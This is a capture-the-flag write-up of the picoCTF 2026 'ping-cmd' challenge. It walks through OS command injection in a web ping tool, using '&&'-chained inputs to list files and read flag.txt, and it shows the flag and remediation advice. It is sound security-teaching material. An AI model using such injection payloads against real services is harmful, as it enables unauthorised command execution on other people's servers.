# CyLab 2026 – ping-cmd Write-up

---

## Step 0 - Challenge Info
* **CTF Name:** picoCTF 2026
* **Challenge Name:** ping-cmd
* **Category:** Web Exploitation
* **Points:** 100
* **Date:** 9/15/2026
* **Flag:** picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_........}

---

## TL;DR (Abstract)
The challenge exposes a web application utility designed to test network reachability using the system's `ping` command. Because user input is passed directly to an underlying shell without proper sanitization or parameterization, an attacker can append shell operators (`&&`) to inject arbitrary operating system commands. By executing `8.8.8.8 && ls`, directory contents were enumerated, revealing `flag.txt`. Executing `8.8.8.8 && cat flag.txt` printed the flag directly to the output.

---

## Challenge Description
> Can you ping a host using our network inspection tool? Check connectivity and see if you can break out of the intended functionality to inspect the server files and retrieve the flag.

---

## Thought Process & Walkthrough

### 1. Initial Reconnaissance
Inspect the web application form, which takes an IP address or hostname to execute an ICMP ping.
Submitting standard input:

8.8.8.8

The server runs the ping utility and prints standard output back to the webpage:

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=14.2 ms
...

This indicates the backend is taking the input string and concatenating it directly into a shell execution call.

### 2. Identifying Command Injection
Using the shell chaining operator `&&`, we can instruct the shell to run an additional command after the initial ping command completes successfully. Test directory listing:

8.8.8.8 && ls

The application executes `ping -c 1 8.8.8.8 && ls` and returns the output:

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=14.1 ms
...
index.php
flag.txt

The listing reveals two files in the current working directory, including `flag.txt`.

### 3. Exploitation & Flag Capture
With arbitrary command execution confirmed and the flag file identified, submit the payload to print the contents of `flag.txt`:

8.8.8.8 && cat flag.txt

The server executes the concatenated command and displays the flag:

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=13.9 ms
...
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_........}

---

## Remediation & Key Takeaways
* **Avoid Shell Execution:** Avoid invoking system utilities via shell functions like `system()`, `exec()`, or `shell_exec()`. Use native language networking APIs to check reachability.
* **Parameterized Execution:** If system commands are mandatory, pass arguments as discrete array elements (e.g. `subprocess.run(["ping", "-c", "1", ip])`) without passing through `/bin/sh`.
* **Strict Input Validation:** Implement strict input allowlisting and IP format validation (e.g. `filter_var($ip, FILTER_VALIDATE_IP)`) prior to any backend handling.
